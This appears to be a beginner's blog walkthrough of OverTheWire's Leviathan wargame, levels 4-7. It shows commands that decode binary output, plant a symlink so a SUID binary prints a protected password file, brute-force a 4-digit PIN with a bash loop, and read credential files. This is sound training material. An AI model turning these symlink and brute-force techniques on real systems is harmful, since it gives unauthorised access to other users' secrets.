---
title: "Leviathan | Levels 4-7 | Binary Encoding, Symlinks & Brute Force"
date: 2026-05-16T09:12:33+02:00
lastmod: 2026-05-16T09:12:33+02:00
description: "A beginner-friendly walkthrough of levels 4-7 in the Leviathan wargame from OverTheWire. Learn how to decode binary output, abuse symbolic links and write your first brute force script to crack a 4-digit PIN."
summary: "A beginner-friendly walkthrough of levels 4-7 in the Leviathan wargame from OverTheWire. Learn how to decode binary output, abuse symbolic links and write your first brute force script to crack a 4-digit PIN."
categories: ["WarGames", "OverTheWire", "Linux"]
series: ["OverTheWire - Leviathan"] # If you write several articles on the same subject
seriesOrder: 2
showSummary: true
showTableOfContents: true
showTaxonomies: true
showReadingTime: true
showWordCount: false
showDate: true
draft: false
---


## Level 4 -> 5

**Level Goal**

> (No hint given.)

**Solution**

Connect as `leviathan4`:

```
[greycipher@remnant ~]$ ssh leviathan4@leviathan.labs.overthewire.org -p 2223
```

The home directory has a hidden `.trash` folder:

```
leviathan4@leviathan:~$ ls -la
dr-xr-x--- 2 root leviathan4 4096 ... .trash

leviathan4@leviathan:~$ ls -la .trash/
-r-sr-x--- 1 leviathan5 leviathan4 7352 ... bin
```

Running the SUID binary gives us an unexpected output:

```
leviathan4@leviathan:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
```

That's binary. Each space-separated group of 8 bits represents one character in ASCII. We can convert it directly from the command line using Perl:

```
leviathan4@leviathan:~/.trash$ ./bin | perl -lape '$_=pack"(B8)*",@F'
[REDACTED]
```

**Notes**

- ASCII is a standard that maps numbers to characters. The binary `01010100` equals decimal `84`, which maps to the letter `T`.
- The Perl one-liner `pack"(B8)*"` interprets each 8-bit group as a binary number and converts it to its ASCII character.
- You could also do this manually using an online binary-to-ASCII converter.

---

## Level 5 -> 6

**Level Goal**

> (No hint given.)

**Solution**

Connect as `leviathan5`:

```
[greycipher@remnant ~]$ ssh leviathan5@leviathan.labs.overthewire.org -p 2223
```

There's a SUID binary in the home directory:

```
leviathan5@leviathan:~$ ls -la
-r-sr-x--- 1 leviathan6 leviathan5 7634 ... leviathan5

leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
```

It's looking for a file that doesn't exist. `ltrace` tells us exactly what's happening:

```plaintext
leviathan5@leviathan:~$ ltrace ./leviathan5
fopen("/tmp/file.log", "r")             = 0
puts("Cannot find /tmp/file.log")
exit(-1)
```

The binary tries to open `/tmp/file.log` and print its contents. We control that path so we create a symlink there pointing at the password file:

```plaintext
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
[REDACTED]
```

The binary opens `/tmp/file.log`, follows the symlink to `/etc/leviathan_pass/leviathan6` and prints it using `leviathan6`'s elevated SUID privileges.

**Notes**

- This is the same symlink trick from Level 2, but in reverse, instead of tricking a binary file into reading the wrong *argument* , here we're planting a fake file in a path the binary *already trusts*.

---

## Level 6 -> 7

**Level Goal**

> (No hint given.)

**Solution**

Connect as `leviathan6`:

```
[greycipher@remnant ~]$ ssh leviathan6@leviathan.labs.overthewire.org -p 2223
```

Another SUID binary, this time asking for a 4-digit PIN:

```
leviathan6@leviathan:~$ ls -la
-r-sr-x--- 1 leviathan7 leviathan6 7484 ... leviathan6

leviathan6@leviathan:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>

leviathan6@leviathan:~$ ./leviathan6 1234
Wrong
```

`ltrace` won't reveal the PIN this time, the comparison is handled differently. With only 10.000 possible combinations (0000-9999), brute force is the practical approach. Write a short bash script in `/tmp`:

```
leviathan6@leviathan:/tmp$ mktemp -d
/tmp/tmp.zPxIib0Czf
leviathan6@leviathan:/tmp$ cd /tmp/tmp.zPxIib0Czf
leviathan6@leviathan:/tmp/tmp.zPxIib0Czf$ cat > brute.sh << 'EOF'
#!/bin/bash
for i in $(seq -w 0 9999); do
  ~/leviathan6 $i
done
EOF

leviathan6@leviathan:/tmp/tmp.zPxIib0Czf $ chmod +x brute.sh
leviathan6@leviathan:/tmp/tmp.zPxIib0Czf $ ./brute.sh
```

After a few seconds you'll see `Wrong` spam stop and a shell prompt appear:

```
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
[REDACTED]
```

**Notes**

- `seq -w 0 9999` generates numbers from `0000` to `9999` with leading zeros preserved, important here since the binary expects exactly 4 digits.
- This is a textbook brute force attack: systematically trying every possible input until one works. It's only feasible here beacuse the search space is tiny (10.000 combinations). Real PIN systems use lockouts and rate limiting specifically to prevent this.

---

## Level 7

Connect as `leviathan7` with the password from the previous level:

```
[greycipher@remnant ~]$ ssh leviathan7@leviathan.labs.overthewire.org -p 2223
```

```
leviathan7@leviathan:~$ ls
CONGRATULATIONS

leviathan7@leviathan:~$ cat CONGRATULATIONS
Well Done, you seem to have used a *nix system before, now try something more serious.
```

That's Leviathan done.

---

# Wrapping up

Leviahan is a short wargame but a meaningful step up from Bandit. The levels don't give you hints, there are no man page suggestions and you're expected to figure out what a binary does just by running it and tracing it. If you worked through both posts in this series, you've now used `ltrace` to intercept hardcoded passwords, exploited a TOCTOU vulnerability, planted symlinks in trusted paths, decoded binary output and written your first brute force script.
